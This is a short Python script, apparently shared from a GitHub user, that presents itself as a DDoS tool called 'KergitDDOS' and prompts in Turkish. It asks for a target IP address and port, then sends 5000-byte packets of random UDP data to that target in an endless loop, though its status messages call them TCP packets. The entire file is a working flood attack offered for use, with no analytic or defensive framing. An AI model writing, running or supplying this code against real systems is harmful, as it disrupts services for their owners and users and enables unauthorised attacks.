import socket , requests , random , colorama
from colorama import init , Fore
init()



banner = """
***********************************
*                                 *
*                                 *
*   KergitDDOS/Github:kayrakrgt   *                           
*                                 *
*                                 *
*                                 *
*                                 *
***********************************


"""

print(Fore.LIGHTMAGENTA_EX+banner)
print(Fore.LIGHTCYAN_EX)


def udp():
   sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
   sock.settimeout(5)
   ip = input("IP Adresi giriniz>>>")
   port = int(input("Port giriniz>>>"))
   try:
         print("IP Adresi bulundu! TCP paketleri gönderiliyor!!!")
         while True:
          try:
           rand = random._urandom(5000)
           sock.sendto(rand, (ip,port))
           print("paket gönderildi!!!")  
          except Exception:
              print("Paket Gönderilemedi!")
   except Exception:
           print("ip adresi bulunamadı")



enter = input("entere basınız")
udp()


